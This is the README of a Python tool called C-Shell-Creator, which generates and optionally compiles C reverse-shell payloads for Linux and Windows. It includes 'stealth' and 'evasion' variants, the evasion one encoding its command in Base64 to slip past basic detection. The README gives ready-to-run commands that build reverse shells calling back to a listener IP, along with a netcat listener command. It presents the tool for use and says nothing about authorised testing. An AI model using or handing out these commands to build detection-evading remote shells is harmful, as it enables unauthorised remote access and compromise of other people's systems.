# C-Shell-Creator

## Overview

**C-Shell-Creator** is a Python-based tool designed to generate various types of reverse shell payloads in C language for both Linux and Windows systems. The script provides different reverse shell types tailored to evade detection, ensure stealth, or offer stability and interactivity.

The tool also supports optional compilation of the generated C code, making it easier for the user to produce ready-to-use executables. 

## Features

- **Cross-Platform Support:** Generate reverse shells for both Linux and Windows systems.
- **Multiple Shell Types:** Choose from simple, stealth, evasion, and stable (for Linux) shell types.
- **Automatic Compilation:** Compile the generated C code directly from the script for easy deployment.
- **Interactive Shells:** Provides an option to create interactive reverse shells for Linux systems.

## Installation

### Dependencies

To use the C-Shells-Creator script, you will need the following dependencies:

1. **Python 3:** The script is written in Python 3.
2. **GCC (GNU Compiler Collection):** Required for compiling C code on Linux.
3. **MinGW (Minimalist GNU for Windows):** Required for cross-compiling C code for Windows on a Linux system.

#### Python Dependencies

No additional Python libraries are required outside the standard library.

#### Installation on Linux

1. **Install Python 3** (if not already installed):
    ```bash
    sudo apt-get install python3
    ```

2. **Install GCC**:
    ```bash
    sudo apt-get install gcc
    ```

3. **Install MinGW for Windows Cross-Compilation** (optional):
    ```bash
    sudo apt-get install mingw-w64
    ```

## Usage

To use the script, execute the Python file with the appropriate arguments:

```bash
python3 C-shells-creator.py --ip <listener_ip> --port <listener_port> --type <shell_type> --system <target_system> --output <output_file> --compile
```

### Arguments

- **--ip**: IP address of the listener (required).
- **--port**: Port of the listener (required).
- **--type**: Type of shell (`simple`, `stealth`, `evasion`, `stable_linux`) (required).
- **--system**: Target system (`linux`, `windows`) (required unless `stable_linux` type is selected).
- **--output**: Output file name (optional).
- **--compile**: Compile the generated C code (optional).

### Available Shell Types

1. **Simple:**
    - A basic reverse shell that connects to the specified listener and redirects standard I/O to the socket.
  
2. **Stealth:**
    - A reverse shell designed to be more covert by hiding the command window on Windows or by using `/bin/bash -i` for Linux.

3. **Evasion:**
    - A reverse shell that encodes the command using Base64 and decodes it at runtime, aimed at evading basic detection methods.

4. **Stable Linux:**
    - A Linux-only reverse shell designed for full interactivity and stability, utilizing `/bin/sh -i`.

### Example Commands

#### 1. Generate a Simple Reverse Shell for Linux

```bash
python3 C-shells-creator.py --ip 192.168.1.10 --port 4444 --type simple --system linux --output simple_shell.c --compile
```

#### 2. Generate a Stealth Reverse Shell for Windows

```bash
python3 C-shells-creator.py --ip 192.168.1.10 --port 4444 --type stealth --system windows --output stealth_shell.c --compile
```

#### 3. Generate an Evasion Reverse Shell for Linux

```bash
python3 C-shells-creator.py --ip 192.168.1.10 --port 4444 --type evasion --system linux --output evasion_shell.c --compile
```

#### 4. Generate a Stable Reverse Shell for Linux

```bash
python3 C-shells-creator.py --ip 192.168.1.10 --port 4444 --type stable_linux --output stable_shell.c --compile
```

#### 5. Generate an Evasion Reverse Shell for Windows

```bash
python3 C-shells-creator.py --ip 192.168.1.10 --port 4444 --type evasion --system windows --output evasion_shell.c --compile
```

## Listener Setup

For Linux reverse shells, especially for the `stable_linux` type, it's recommended to use `rlwrap` with `nc` for better interactivity:

```bash
rlwrap nc -nlvp 4444
```

### Notes

- **Windows Compilation:** If you intend to cross-compile for Windows, ensure `mingw-w64` is installed.
- **Listener Configuration:** For stable shells, ensure the terminal is configured correctly by using `rlwrap` or `stty` commands.

## License

This project is licensed under the MIT License.
